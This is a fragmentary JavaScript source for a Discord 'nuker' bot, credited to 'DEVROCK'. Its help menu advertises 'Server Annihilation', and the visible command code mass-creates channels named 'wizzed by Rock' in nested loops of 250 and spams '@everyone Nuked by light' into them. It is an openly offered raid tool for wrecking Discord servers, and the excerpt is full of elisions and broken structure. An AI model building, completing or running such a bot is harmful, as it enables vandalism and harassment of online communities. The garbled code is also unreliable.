...
const presser = String.raw`            Creator: DEVROCK/
`;
...
client.on("ready", () => {
    ...
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log("");
    client.user.setActivity({ type: "PLAYING", name: "YOUR SERVER" }); // Delete this if you wish.
});
...
\` [text]
            ...
            **Server Annihilation:** \`${prefix}die\` [text]
            `)
            .setThumbnail(``)
            .setFooter(`© light nuker /| Prefix: ${prefix} | Author: DEVROCK | Cord: ${founder}`)
            .setColor(0x36393E)
  ...
  DEVROCK //       .setTimestamp(Date.now());
        ...
        if (message.content.startsWith(prefix + 'mp')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                ...
                if (!argresult) {
                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create('wizzed by Rock')

                        for (var i = 0; i < 250; i++) {
                            let channels = message.guild.channels.create('wizzed by Rock')

                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 250; i++) {
                                        channel.send('@everyone Nuked by light' + argresult)
            ...
            if (message.author.id != myID) {
                ...
                const helpEmbed = new Discord.MessageEmbed()
                    ...
                    **Server Annihilation:** \`${prefix}die\` [text]
                    `)
                    .setThumbnail(``)
                    .setFooter(`© DEVROCK | Prefix: ${prefix} | Author: Rock | Cord: ${founder}`)
                    .setColor(0x36393E)
                    .setTimestamp(Date.now());
                message.channel.send(helpEmbed);
            }
                ...
                if (message.author.id != myID) {
                    ...
                    if (!argresult) {
                        for (var i = 0; i < 250; i++) {
                            ...
                            for (var i = 0; i < 250; i++) {
                                let channels = message.guild.channels.create('wizzed by ')
